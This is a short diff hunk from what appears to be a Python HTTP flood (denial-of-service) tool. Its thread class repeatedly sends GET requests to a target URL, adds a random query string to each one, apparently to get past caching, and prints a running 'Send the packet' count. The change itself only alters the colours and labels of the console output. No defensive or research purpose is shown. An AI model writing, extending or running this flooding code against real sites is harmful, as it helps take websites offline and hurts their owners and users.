@@ -98,8 +98,8 @@ class httpth1(threading.Thread):
                 randomized_url = url + "?" + genstr(random.randint(3, 10))
                 requests.get(randomized_url, headers=headers)
                 u += 1
-                print("[*]  \033[102mSRK-313 " +str(u)+ "   \033[37mSend the packet  \033[34m " +url+ "\033[0m" )  
-                print("[*]  \033[313mSRK-313 " +str(u)+ "   \033[37mSend the packet  \033[34m " +url+ "\033[0m" )      
+                print("\033[41mred[]  \033[102mSRK-313 " +str(u)+ "   \033[37mSend the packet  \033[34m " +url+ "\033[0m" )  
+                print("[]  \033[313mSRK-313 " +str(u)+ "   \033[37mSend the packet  \033[34m " +url+ "\033[0m" )      
             except requests.exceptions.ConnectionError:
                 print("[*]  \033[1mBOT --> \033[1m " +str(u)+ "   \033[97mSend the packet  \033[35m " +url+ "\033[0m" )
                 pass
